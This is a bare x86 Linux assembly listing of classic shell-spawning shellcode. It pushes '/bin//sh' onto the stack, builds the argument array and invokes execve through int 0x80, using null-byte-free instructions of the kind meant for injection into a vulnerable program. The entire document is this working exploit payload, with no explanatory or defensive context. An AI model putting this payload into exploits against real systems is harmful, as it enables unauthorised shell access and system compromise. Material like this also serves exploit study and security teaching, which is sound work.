        .intel_syntax noprefix
        .globl _start
_start:
        xor edx, edx
        push edx
        push 0x68732f2f
        push 0x6e69622f    /* "/bin//sh" */
        mov ebx, esp
        push edx
        push ebx
        mov ecx, esp
        lea eax, [edx+11]  /* execve */
        int 0x80
